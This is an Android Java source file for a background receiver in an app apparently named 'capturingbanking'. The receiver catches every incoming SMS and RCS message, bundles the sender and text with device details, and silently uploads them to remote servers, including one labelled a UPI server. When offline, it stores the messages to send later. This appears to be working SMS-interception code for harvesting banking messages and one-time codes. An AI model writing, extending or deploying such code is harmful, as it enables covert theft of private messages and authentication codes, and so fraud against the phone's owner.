package com.suleman.capturingbanking.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.fxn.stash.Stash;
import com.suleman.capturingbanking.api.ResponseCallback;
import com.suleman.capturingbanking.api.ServerConnector;
import com.suleman.capturingbanking.db.AppDatabase;
import com.suleman.capturingbanking.db.MessageDAO;
import com.suleman.capturingbanking.model.DeviceModel;
import com.suleman.capturingbanking.model.MessageModel;
import com.suleman.capturingbanking.utilies.NetworkUtil;
import com.suleman.capturingbanking.utilies.Utils;

public class MessageReceiver extends BroadcastReceiver {
    public String TAG = "MyPhoneStateListener";
    Context context;
    public static final String INFO = "INFO";
    private MessageDAO messageDAO;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive");
        this.context = context;
        AppDatabase database = AppDatabase.getInstance(context);
        messageDAO = database.messageDAO();
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") || intent.getAction().equals("com.google.android.gms.rcs.RECEIVE_RCS_MESSAGE")) {
            Log.d(TAG, "onReceive SMS");
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder fullMessage = new StringBuilder();
                    String sender = "";
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        sender = smsMessage.getDisplayOriginatingAddress();
                        fullMessage.append(smsMessage.getMessageBody());
                    }

                    // Check if the message is a duplicate
                    if (Utils.isDuplicateMessage(context, fullMessage.toString(), sender)) {
                        Log.d(TAG, "Duplicate SMS received, ignoring...");
                        return;
                    }

                    DeviceModel deviceModel = (DeviceModel) Stash.getObject(INFO, DeviceModel.class);
                    if (deviceModel != null) {
                        MessageModel model = Utils.getMessageModel(fullMessage.toString(), sender, deviceModel);
                        if (NetworkUtil.isNetworkAvailable(context)) {
                            getJWT(model);
                        } else {
                            messageDAO.insert(model);
                        }
                    }
                }
            }
        }
    }

    private void getJWT(MessageModel model) {
        ServerConnector.getInstance(false).loginUser(new ResponseCallback() {
            @Override
            public void onSuccess(Object response) {
                callApi(context, model.toJson());
            }

            @Override
            public void onError(String response) {
                Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void callApi(Context context, String body) {
        try {
            ServerConnector.getInstance(false).sendMessage(
                    body, new ResponseCallback() {
                        @Override
                        public void onSuccess(Object response) {
                            Log.d(TAG, "Response UPI: " + response.toString());
                        }

                        @Override
                        public void onError(String response) {
                            Log.d(TAG, "Response UPI Error: " + response.toString());
                        }
                    }
            );

            ServerConnector.getInstance(true).sendMessageToUpiServer(
                    body, new ResponseCallback() {
                        @Override
                        public void onSuccess(Object response) {
                            Log.d(TAG, "Response UPI: " + response.toString());
                        }

                        @Override
                        public void onError(String response) {
                            Log.d(TAG, "Response UPI Error: " + response.toString());
                        }
                    }
            );
        } catch (SecurityException e) {
            Toast.makeText(context, e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
}